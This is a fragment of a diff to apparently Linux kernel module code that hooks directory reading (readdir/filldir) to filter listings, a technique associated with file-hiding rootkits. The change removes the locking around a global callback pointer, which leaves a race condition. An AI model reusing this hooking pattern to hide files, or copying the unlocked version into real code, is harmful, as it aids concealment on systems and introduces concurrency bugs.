@@ -21,47 +21,14 @@ static int filtering_filldir(void *buffer, const char *name, int namelen,
 	return g_original_filldir(buffer, name, namelen, offset, ino, d_type);
 }
 
-/*
- *  We need to pass the original filldir() to filtering_filldir(),
- *  this is done via g_original_filldir pointer.
- *
- *  The pointer is protected by two locks:
- *
- *    * g_readdir_lock ensures that no call to filterind_readdir() will
- *      overwrite current g_original_filldir while the filtering_filldir()
- *      may need it;
- *
- *    * g_filldir_lock permits any number of recursive calls to readdir()
- *      from the same filtering_readdir() (e.g., when VFS reads the `.'
- *      directory entry), but blocks anything else.
- */
-
-static DEFINE_MUTEX(g_readdir_lock);
-static DECLARE_RWSEM(g_filldir_lock);
-
 static int filtering_readdir(struct file *dir, void *data, filldir_t filldir)
 {
-	int err;
-
-	down_read(&g_filldir_lock);
-	if (filldir == g_original_filldir) {
-		err = dir->f_dentry->d_sb->s_root->d_inode->i_fop
-			->readdir(dir, data, filtering_filldir);
-		up_read(&g_filldir_lock);
-		return err;
+	if (filldir != filtering_filldir) {
+		g_original_filldir = filldir;
 	}
-	up_read(&g_filldir_lock);
 
-	mutex_lock(&g_readdir_lock);
-	g_original_filldir = filldir;
-	err = dir->f_dentry->d_sb->s_root->d_inode->i_fop
+	return dir->f_dentry->d_sb->s_root->d_inode->i_fop
 		->readdir(dir, data, filtering_filldir);
-	down_write(&g_filldir_lock);
-	g_original_filldir = NULL;
-	up_write(&g_filldir_lock);
-	mutex_unlock(&g_readdir_lock);
-
-	return err;
 }
 
 /*
